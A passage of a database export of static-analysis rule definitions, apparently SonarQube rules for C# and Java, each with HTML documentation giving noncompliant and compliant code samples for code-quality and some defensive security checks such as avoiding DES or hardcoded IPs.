in Switch Statement</li>\n    <li><a href="https://www.securecoding.cert.org/confluence/x/YgE">CERT, MSC01-C</a> - Strive for logical completeness</li>\n    <li><a href="https://www.securecoding.cert.org/confluence/x/JoIyAQ">CERT, MSC01-CPP</a> - Strive for logical completeness</li>\n</ul>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cert,cwe,misra	f	HTML	1511453806280	1511453806281	1
38	Doubled prefix operators "!!" and "~~" should not be used	S2761	\N	csharpsquid	<p>\n    Calling the <code>!</code> or <code>~</code> prefix operator twice does nothing: the second invocation undoes the first.\n    Such mistakes are typically caused by accidentally double-tapping the key in question without noticing.\n</p>\n<p>\n    Either this is a bug, if the operator was actually meant to be called once, or misleading if done on purpose.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nint v1 = 0;\nbool v2 = false;\n\nvar v3 = !!v1; // Noncompliant\nvar v4 = ~~v2; // Noncompliant\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nint v1 = 0;\nbool v2 = false;\n\nvar v3 = !v1;\nvar v4 = ~v2;\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453806282	1511453806282	2
39	Values should not be uselessly incremented	S2123	\N	csharpsquid	<p>\n    A value that is incremented or decremented and then not stored is at best wasted code and at worst a bug.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic int pickNumber()\n{\n  int i = 0;\n  int j = 0;\n\n  i = i++; // Noncompliant; i is still zero\n\n  return j++; // Noncompliant; 0 returned\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic int pickNumber()\n{\n  int i = 0;\n  int j = 0;\n\n  i++;\n  return ++j;\n}\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453806283	1511453806283	2
40	"Any()" should be used to test for emptiness	S1155	\N	csharpsquid	<p>\n    Using <code>.Count()</code> to test for emptiness works, but using <code>.Any()</code> makes the intent clearer,\n    and the code more readable.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nprivate static bool HasContent(IEnumerable&lt;string&gt; strings)\n{\n  return strings.Count() > 0; // Noncompliant\n}\nprivate static bool HasContent2(IEnumerable&lt;string&gt; strings)\n{\n  return strings.Count() >= 1; // Noncompliant\n}\nprivate static bool IsEmpty(IEnumerable&lt;string&gt; strings)\n{\n  return strings.Count() == 0; // Noncompliant\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nprivate static bool HasContent(IEnumerable&lt;string&gt; strings)\n{\n  return strings.Any();\n}\n\nprivate static bool IsEmpty(IEnumerable&lt;string&gt; strings)\n{\n  return !strings.Any();\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	clumsy	f	HTML	1511453806283	1511453806284	1
42	"string.ToCharArray()" should not be called redundantly	S3456	\N	csharpsquid	<p>\n    <code>ToCharArray</code> can be omitted when the operation on the array could have been done directly on the string, such as when\n    iterating over the characters in a string, and when accessing a character in a string via an array index. In those cases, explicit\n    <code>ToCharArray</code> calls should be omitted.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nstring str = "some string";\nforeach (var c in str.ToCharArray()) // Noncompliant\n{\n  // ...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nstring str = "some string";\nforeach (var c in str)\n{\n  // ...\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	clumsy	f	HTML	1511453806285	1511453806289	1
43	"ConfigureAwait(false)" should be used	S3216	\N	csharpsquid	<p>\n    After an <code>await</code>ed <code>Task</code> has executed, you can continue execution in the original, calling\n    thread or any arbitrary thread. Unless the rest of the code needs the context from which the <code>Task</code> was\n    spawned, <code>Task.ConfigureAwait(false)</code> should be used to keep execution in the <code>Task</code> thread\n    to avoid the need of context switching and the possibility of deadlocks.\n</p>\n<p>\n    This rule raises an issue when code in a class library <code>await</code>s a <code>Task</code> and continues\n    execution in the original calling thread.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar response = await httpClient.GetAsync(url);  // Noncompliant\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar response = await httpClient.GetAsync(url).ConfigureAwait(false);\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	multi-threading,suspicious	f	HTML	1511453806291	1511453806292	1
44	"interface" instances should not be cast to concrete types	S3215	\N	csharpsquid	<p>\n    Needing to cast from an <code>interface</code> to a concrete type indicates that something is wrong with the abstractions in\n    use, likely that something is missing from the <code>interface</code>. Instead of casting to a discrete type, the missing\n    functionality should be added to the <code>interface</code>. Otherwise there is the risk of runtime exceptions.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic interface IMyInterface\n{\n  void DoStuff();\n}\n\npublic class MyClass1 : IMyInterface\n{\n  public int Data { get { return new Random().Next(); } }\n\n  public void DoStuff()\n  {\n    // TODO...\n  }\n}\n\npublic static class DowncastExampleProgram\n{\n  static void EntryPoint(IMyInterface interfaceRef)\n  {\n    MyClass1 class1 = (MyClass1)interfaceRef;  // Noncompliant\n    int privateData = class1.Data;\n\n    class1 = interfaceRef as MyClass1;  // Noncompliant\n    if (class1 != null)\n    {\n      // ...\n    }\n  }\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1h	\N	\N	design	f	HTML	1511453806293	1511453806294	1
45	IP addresses should not be hardcoded	S1313	\N	csharpsquid	<p>\n    Hardcoding an IP address into source code is a bad idea for several reasons:\n    <ul>\n        <li>\n            a recompile is required if the address changes\n        </li>\n        <li>\n            it forces the same address to be used in every environment (dev, sys, qa, prod)\n        </li>\n        <li>\n            it places the responsibility of setting the value to use in production on the shoulders of the developer\n        </li>\n        <li>\n            it allows attackers to decompile the code and thereby discover a potentially sensitive address\n        </li>\n    </ul>\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar ip = "127.0.0.1";\nvar address = IPAddress.Parse(ip);\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar ip = ConfigurationManager.AppSettings["myapplication.ip"];\nvar address = IPAddress.Parse(ip);\n</pre>\n\n<h2>Exceptions</h2>\n<p>\n    Although "::" is a valid IPv6 address, the rule doesn't report on it.\n</p>\n\n<h2>See</h2>\n\n<ul>\n    <li> <a href="https://www.securecoding.cert.org/confluence/x/qQCHAQ">CERT, MSC03-J</a> - Never hard code sensitive information</li>\n</ul>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	cert	f	HTML	1511453806294	1511453806295	3
147	Nested blocks of code should not be left empty	S108	\N	csharpsquid	<p>\nMost of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfor (int i = 0; i < 42; i++) {}  // Empty on purpose or missing piece of code ?\n</pre>\n\n<h2>Exceptions</h2>\n<p>\n    When a block contains a comment, this block is not considered to be empty.\n</p>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	suspicious	f	HTML	1511453806443	1511453806443	1
46	Public methods should not have multidimensional array parameters	S2368	\N	csharpsquid	<p>\n    Exposing methods with multidimensional array parameters require developers to have advanced knowledge about the language in\n    order to be able to use them. Moreover, what exactly to pass to such parameters is not intuitive. Therefore, such methods\n    should not be exposed, but can be used internally.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Program\n{\n    public void WriteMatrix(int[][] matrix) // Non-Compliant\n    {\n    }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\npublic class Matrix\n{\n    // ...\n}\n\npublic class Program\n{\n    public void WriteMatrix(Matrix matrix) // Compliant\n    {\n    }\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1h	\N	\N	pitfall	f	HTML	1511453806295	1511453806297	1
47	"string.Format()" should not be called without placeholders	S3457	\N	csharpsquid	<p>\n    There's no need to incur the overhead of a formatting call when the string to be formatted contains no formatting symbols.\n    Instead, simply use the original input string.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar s = string.Format("some text");\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar s = "some text";\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	confusing	f	HTML	1511453806297	1511453806298	1
48	The simplest possible condition syntax should be used	S3240	\N	csharpsquid	<p>\n    In the interests of keeping code clean, the simplest possible conditional syntax should be used. That means using\n    the <code>??</code> operator for an assign-if-not-null operator, and using the ternary operator <code>?:</code> for\n    assignment to a single variable.\n</p>\n\n<h2>Noncompliant Code Sample</h2>\n<pre>\nobject a = null, b = null, x;\n\nif (a != null) // Noncompliant; needlessly verbose\n{\n  x = a;\n}\nelse\n{\n  x = b;\n}\n\nx = a != null ? a : b; // Noncompliant; better but could still be simplified\n\nx = (a == null) ? new object() : a; // Noncompliant\n\nif (condition) // Noncompliant\n{\n  x = a;\n}\nelse\n{\n  x = b;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nobject x;\n\nx = a ?? b;\nx = a ?? b;\nx = a ?? new object();\nx = condition ? a : b;\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	clumsy	f	HTML	1511453806298	1511453806299	1
49	Method parameters and caught exceptions should not be reassigned	S1226	\N	csharpsquid	<p>\n    While it is technically correct to assign to parameters from within method bodies, it is better to use temporary variables to store intermediate results.\n    This rule will typically detect cases where a constructor parameter is assigned to itself instead of a field of the same name, i.e. when <code>this</code> was forgotten.\n    Allowing parameters to be assigned to also reduces the code readability as developers will not be able to know whether the original parameter or some temporary variable is being accessed without going through the whole method.\n    Moreover, some developers might also expect assignments of method parameters to be visible from callers, which is not the case and can confuse them.\n    All parameters should be treated as <code>readonly</code>.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass MyClass\n{\n  public string name;\n\n  public MyClass(string name)\n  {\n    name = name;                    // Noncompliant - useless identity assignment\n  }\n\n  public int Add(int a, int b)\n  {\n    a = a + b;                      // Noncompliant\n\n    /* additional logic */\n\n    return a;                       // Seems like the parameter is returned as is, what is the point?\n  }\n\n  public static void Main()\n  {\n    MyClass foo = new MyClass();\n    int a = 40;\n    int b = 2;\n    foo.Add(a, b);                  // Variable "a" will still hold 40 after this call\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nclass MyClass\n{\n  public string name;\n\n  public MyClass(string name)\n  {\n    this.name = name;               // Compliant\n  }\n\n  public int Add(int a, int b)\n  {\n    return a + b;                   // Compliant\n  }\n\n  public static void Main()\n  {\n    MyClass foo = new MyClass();\n    int a = 40;\n    int b = 2;\n    foo.Add(a, b);\n  }\n}\n</pre>\n\n<h2>See</h2>\n<ul>\n    <li>MISRA C:2012, 17.8 - A function parameter should not be modified</li>\n</ul>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	misra,pitfall	f	HTML	1511453806299	1511453806300	1
50	Silly bit operations should not be performed	S2437	\N	csharpsquid	<p>\n    Certain bit operations are just silly and should not be performed because their results are predictable.\n</p>\n<p>\n    Specifically, using <code>&amp; -1</code> with any value will always result in the original value, as will\n    <code>anyValue ^ 0</code> and <code>anyValue | 0</code>.\n</p>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	suspicious	f	HTML	1511453806301	1511453806301	1
52	Methods named "Dispose" should implement "IDisposable.Dispose"	S2953	\N	csharpsquid	<p>\n    <code>Dispose</code> as a method name should be used exclusively to implement <code>IDisposable.Dispose</code> to prevent\n    any confusion.\n</p>\n<p>\n    It may be tempting to create a <code>Dispose</code> method for other purposes, but doing so will result in confusion and\n    likely lead to problems in production.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class GarbageDisposal\n{\n  private int Dispose()  // Noncompliant\n  {\n    // ...\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class GarbageDisposal : IDisposable\n{\n  public void Dispose()\n  {\n    // ...\n  }\n}\n</pre>\nor\n<pre>\npublic class GarbageDisposal\n{\n  private int Grind()\n  {\n    // ...\n  }\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>\n    Methods named <code>Dispose</code> and invoked from the <code>IDisposable.Dispose</code> implementation are not reported.\n</p>\n<pre>\npublic class GarbageDisposal : IDisposable\n{\n  protected virtual void Dispose(bool disposing)\n  {\n    //...\n  }\n  public void Dispose()\n  {\n    Dispose(true);\n    GC.SuppressFinalize(this);\n  }\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	pitfall	f	HTML	1511453806303	1511453806304	1
53	Generic parameters not constrained to reference types should not be compared to "null"	S2955	\N	csharpsquid	<p>\n    When constraints have not been applied to restrict a generic type parameter to be a reference type,\n    then a value type, such as a <code>struct</code>, could also be passed. In such cases, comparing the\n    type parameter to <code>null</code> would always be false, because a <code>struct</code> can\n    be empty, but never <code>null</code>. If a value type is truly what's expected, then the comparison should use\n    <code>default()</code>. If it's not, then constraints should be added so that no value type can be\n    passed.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nprivate bool IsDefault&lt;T&gt;(T value)\n{\n  if (value == null) // Noncompliant\n  {\n    // ...\n  }\n  // ...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nprivate bool IsDefault&lt;T&gt;(T value)\n{\n  if(object.Equals(value, default(T)))\n  {\n    // ...\n  }\n  // ...\n}\n</pre>\nor\n<pre>\nprivate bool IsDefault&lt;T&gt;(T value) where T : class\n{\n  if (value == null)\n  {\n    // ...\n  }\n  // ...\n}\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	\N	f	HTML	1511453806305	1511453806305	2
54	A close curly brace should be located at the beginning of a line	S1109	\N	csharpsquid	<p>\nShared coding conventions make it possible for a team to efficiently collaborate. This rule makes it mandatory to place a close curly brace at the beginning of a line.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nif(condition)\n{\n  doSomething();}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif(condition)\n{\n  doSomething();\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>When blocks are inlined (open and close curly braces on the same line), no issue is triggered.</p>\n<pre>\nif(condition) { doSomething(); }\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	convention	f	HTML	1511453806306	1511453806306	1
55	Overriding members should do more than simply call the same member in the super class	S1185	\N	csharpsquid	<p>\n    Overriding a member just to call the same member from the base class without performing any other actions is useless and\n    misleading. The only time this is justified is in <code>sealed</code> overriding methods, where the effect is to lock in\n    the parent class behavior.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic override void Method() // Noncompliant\n{\n  base.Method();\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic override void Method()\n{\n  //do something else\n}\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	clumsy	f	HTML	1511453806307	1511453806307	1
56	Format strings should be passed the correct number of arguments	S2275	\N	csharpsquid	<p>\n    Use fewer arguments than are expected in your format string, and you'll get an error at runtime. Use more arguments than are\n    expected, and you probably won't get the output you expect. Either way, it's a bug.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar s1 = string.Format("{0} {1} {2}", 1, 2); // Noncompliant; too few arguments\nvar s2 = string.Format("{0}", 10, 11); // Noncompliant; too many arguments\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\n// Pass the expected number of arguments\nvar s1 = string.Format("{0} {1} {2}", 1, 2, 3);\nvar s2 = string.Format("{0}", 10);\n</pre>\nor\n<pre>\n// Fix the format string\nvar s1 = string.Format("{0} {1}", 1, 2);\nvar s2 = string.Format("{0} {1}", 10, 11);\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	pitfall	f	HTML	1511453806308	1511453806309	2
57	Methods should not be empty	S1186	\N	csharpsquid	<p>\nThere are several reasons for a method not to have a method body:\n  <ul>\n    <li>It is an unintentional omission, and should be fixed.</li>\n    <li>It is not yet, or never will be, supported. In this case an <code>NotSupportedException</code> should be thrown.</li>\n    <li>The method is an intentionally-blank override. In this case a nested comment should explain the reason for the blank override.</li>\n  </ul>\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic override void DoSomething()\n{\n}\n\npublic override void doSomethingElse()\n{\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic override void DoSomething()\n{\n  // Do nothing because of X and Y.\n}\n\npublic override void doSomethingElse()\n{\n  throw new NotSupportedException();\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>An abstract class' may have empty methods, in order to provide default implementations for child classes.</p>\n<pre>\nabstract class Animal\n{\n  public void Speak()\n  {\n  }\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	suspicious	f	HTML	1511453806310	1511453806310	1
58	Collapsible "if" statements should be merged	S1066	\N	csharpsquid	<p>\n    Merging collapsible <code>if</code> statements increases the code's readability.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (condition1)\n{\n  if (condition2)\n  {\n    ...\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif (condition1 &amp;&amp; condition2)\n{\n  ...\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	clumsy	f	HTML	1511453806311	1511453806311	1
59	Anonymous delegates should not be used to unsubscribe from Events	S3244	\N	csharpsquid	<p>\n    It is possible to subscribe to events with anonymous delegates, but having done so, it is impossible to unsubscribe from them.\n    That's because the process of subscribing adds the delegate to a list. The process of unsubscribing essentially says: remove\n    this item from the subscription list. But because an anonymous delegate was used in both cases, the unsubscribe attempt tries\n    to remove a different item from the list than was added. The result: <code>NOOP</code>.\n</p>\n<p>\n    Instead, save the delegate to a variable and use the variable to subscribe and unsubscribe.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nlistView.PreviewTextInput += (obj,args) =>\n        listView_PreviewTextInput(obj,args,listView);\n\n// ...\n\nlistView.PreviewTextInput -= (obj, args) =>\n        listView_PreviewTextInput(obj, args, listView); // Noncompliant; this delegate was never subscribed\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nEventHandler func = (obj,args) => listView_PreviewTextInput(obj,args,listView);\n\nlistView.PreviewTextInput += func;\n\n// ...\n\nlistView.PreviewTextInput -= func;\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	\N	f	HTML	1511453806312	1511453806312	2
686	Useless parentheses around expressions should be removed to prevent any misunderstanding	UselessParenthesesCheck	UselessParenthesesCheck	squid	<p>\nUseless parentheses can sometimes be misleading and so should be removed.\n</p>\n\n<p>\nThe following code snippet illustrates this rule:\n</p>\n\n<pre>\nreturn 3;             // Compliant\nreturn (x);           // Noncompliant\nreturn (x + 1);       // Noncompliant\nint x = (y / 2 + 1);  // Noncompliant\nint y = (4+X) * y;    // Compliant\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	confusing	f	HTML	1511453807220	1511453807220	1
687	Unused private method should be removed	UnusedPrivateMethod	UnusedPrivateMethod	squid	<p>Private methods that are never executed are dead code: unnecessary, inoperative code that should be removed. Cleaning out dead code decreases the size of the maintained codebase, making it easier to understand the program and preventing bugs from being introduced.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic class Foo implements Serializable\n{\n  private Foo(){}     //Compliant, private empty constructor intentionally used to prevent any direct instantiation of a class.\n  public static void doSomething(){\n    Foo foo = new Foo();\n    ...\n  }\n  private void unusedPrivateMethod(){...}\n  private void writeObject(ObjectOutputStream s){...}  //Compliant, relates to the java serialization mechanism\n  private void readObject(ObjectInputStream in){...}  //Compliant, relates to the java serialization mechanism\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic class Foo implements Serializable\n{\n  private Foo(){}     //Compliant, private empty constructor intentionally used to prevent any direct instantiation of a class.\n  public static void doSomething(){\n    Foo foo = new Foo();\n    ...\n  }\n\n  private void writeObject(ObjectOutputStream s){...}  //Compliant, relates to the java serialization mechanism\n\n  private void readObject(ObjectInputStream in){...}  //Compliant, relates to the java serialization mechanism\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	unused	f	HTML	1511453807221	1511453807221	1
60	Expressions should not be too complex	S1067	\N	csharpsquid	<p>\nThe complexity of an expression is defined by the number of <code>&&</code>, <code>||</code> and <code>condition ? ifTrue : ifFalse</code> operators it contains.<br/>\nA single expression's complexity should not become too high to keep the code readable.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<p>With the default threshold value 3</p>\n<pre>\nif (((condition1 && condition2) || (condition3 && condition4)) && condition5) { ... }\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif ( (myFirstCondition() || mySecondCondition()) && myLastCondition()) { ... }\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	brain-overload	f	HTML	1511453806313	1511453806314	1
61	Types and "this" should not be used for locking	S2551	\N	csharpsquid	<p>\n    Locking on the current object instance (i.e. <code>this</code>), or on a <code>Type</code> object increases the chance\n    of deadlocks because any other thread could acquire (or attempt to acquire) the same lock for another unrelated purpose.\n</p>\n<p>\n    Instead, a new, private <code>object</code> should be created and used for the lock.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void MyLockingMethod()\n{\n  lock (this) // Noncompliant\n  {\n    // ...\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nobject lockObj = new object();\n\npublic void MyLockingMethod()\n{\n  lock (lockObj)\n  {\n    // ...\n  }\n}\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	multi-threading	f	HTML	1511453806318	1511453806318	2
62	"ThreadStatic" should not be used on non-static fields	S3005	\N	csharpsquid	<p>\n    When a non-<code>static</code> class field is annotated with <code>ThreadStatic</code>, the code seems to show that the\n    field can have different values for different calling threads, but that's not the case, since the <code>ThreadStatic</code>\n    attribute is simply ignored on non-<code>static</code> fields.\n</p>\n<p>\n    So <code>ThreadStatic</code> should either be removed or replaced with a use of the <code>ThreadLocal&lt;T&gt;</code> class,\n    which gives a similar behavior for non-<code>static</code> fields.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass\n{\n  [ThreadStatic]  // Noncompliant\n  private int count = 0;\n\n  // ...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass\n{\n  private int count = 0;\n\n  // ...\n}\n</pre>\nor\n<pre>\npublic class MyClass\n{\n  private readonly ThreadLocal&lt;int&gt; count = new ThreadLocal&lt;int&gt;();\n  public int Count\n  {\n    get { return count.Value; }\n    set { count.Value = value; }\n  }\n  // ...\n}\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	unused	f	HTML	1511453806319	1511453806319	2
78	Redundant parentheses should not be used	S3235	\N	csharpsquid	<p>\n    Redundant parentheses are simply wasted keystrokes, and should be removed.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n[MyAttribute()] //Noncompliant\nclass MyClass\n{\n  public int MyProperty { get; set; }\n  public static MyClass CreateNew(int propertyValue)\n  {\n    return new MyClass() //Noncompliant\n    {\n      MyProperty = propertyValue\n    };\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\n[MyAttribute]\nclass MyClass\n{\n  public int MyProperty { get; set; }\n  public static MyClass CreateNew(int propertyValue)\n  {\n    return new MyClass\n    {\n      MyProperty = propertyValue\n    };\n  }\n}\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	finding,unused	f	HTML	1511453806337	1511453806338	1
63	Generic type parameters should be co/contravariant when possible	S3246	\N	csharpsquid	<p>\n    In the interests of making code as usable as possible, interfaces and delegates with generic parameters should use the\n    <code>out</code> and <code>in</code> modifiers when possible to make the interfaces and delegates covariant and contravariant,\n    respectively.\n</p>\n<p>\n    The <code>out</code> keyword can be used when the type parameter is used only as a return type in the interface or delegate.\n    Doing so makes the parameter covariant, and allows interface and delegate instances created with a sub-type to be used as\n    instances created with a base type. The most notable example of this is <code>IEnumerable&lt;out T&gt;</code>, which allows\n    the assignment of an <code>IEnumerable&lt;string&gt;</code> instance to an <code>IEnumerable&lt;object&gt;</code> variable,\n    for instance.\n</p>\n<p>\n    The <code>in</code> keyword can be used when the type parameter is used only as a method parameter in the interface or a\n    parameter in the delegate. Doing so makes the parameter contravariant, and allows interface and delegate instances created\n    with a base type to be used as instances created with a sub-type. I.e. this is the inversion of covariance. The most notable\n    example of this is the <code>Action&lt;in T&gt;</code> delegate, which allows the assignment of an\n    <code>Action&lt;object&gt;</code> instance to a <code>Action&lt;string&gt;</code> variable, for instance.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\ninterface IConsumer&lt;T&gt;  // Noncompliant\n{\n    bool Eat(T fruit);\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\ninterface IConsumer&lt;in T&gt;\n{\n    bool Eat(T fruit);\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	api-design	f	HTML	1511453806320	1511453806320	1
64	Neither DES (Data Encryption Standard) nor DESede (3DES) should be used	S2278	\N	csharpsquid	<p>\n    According to the US National Institute of Standards and Technology (NIST), the Data Encryption Standard (DES) is no longer\n    considered secure:\n</p>\n<blockquote>\n    <p>\n        Adopted in 1977 for federal agencies to use in protecting sensitive, unclassified information, the DES is being withdrawn\n        because it no longer provides the security that is needed to protect federal government information.\n    </p>\n    <p>\n        Federal agencies are encouraged to use the Advanced Encryption Standard, a faster and stronger algorithm approved as FIPS\n        197 in 2001.\n    </p>\n</blockquote>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nusing (var tripleDES = new TripleDESCryptoServiceProvider()) //Noncompliant\n{\n  //...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nusing (var aes = new AesCryptoServiceProvider())\n{\n  //...\n}\n</pre>\n\n<h2>See</h2>\n\n<ul>\n    <li><a href="http://cwe.mitre.org/data/definitions/326.html">MITRE CWE-326</a> - Inadequate Encryption Strength</li>\n    <li><a href="http://cwe.mitre.org/data/definitions/327.html">MITRE CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm</li>\n    <li><a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten 2013 Category A6</a> - Sensitive Data Exposure</li>\n    <li>Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#DES_USAGE">DES / DESede Unsafe</a></li>\n</ul>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	cwe,owasp-a6	f	HTML	1511453806322	1511453806322	3
65	The length returned from a stream read should be checked	S2674	\N	csharpsquid	<p>\n    You cannot assume that any given stream reading call will fill the <code>byte[]</code> passed in to the method with\n    the number of bytes requested. Instead, you must check the value returned by the read method to see how many bytes\n    were read. Fail to do so, and you introduce a bug that is both harmful and difficult to reproduce.\n</p>\n<p>\n    This rule raises an issue when a <code>Stream.Read</code> or a <code>Stream.ReadAsync</code> method is called, but\n    the return value is not checked.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void DoSomething(string fileName)\n{\n  using (var stream = File.Open(fileName, FileMode.Open))\n  {\n    var result = new byte[stream.Length];\n    stream.Read(result, 0, (int)stream.Length); // Noncompliant\n    // ... do something with result\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic void DoSomething(string fileName)\n{\n  using (var stream = File.Open(fileName, FileMode.Open))\n  {\n    var buffer = new byte[1024];\n    using (var ms = new MemoryStream())\n    {\n        int read;\n        while ((read = stream.Read(buffer, 0, buffer.Length)) > 0)\n        {\n            ms.Write(buffer, 0, read);\n        }\n        // ... do something with ms\n    }\n  }\n}\n</pre>	4	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	\N	f	HTML	1511453806323	1511453806323	2
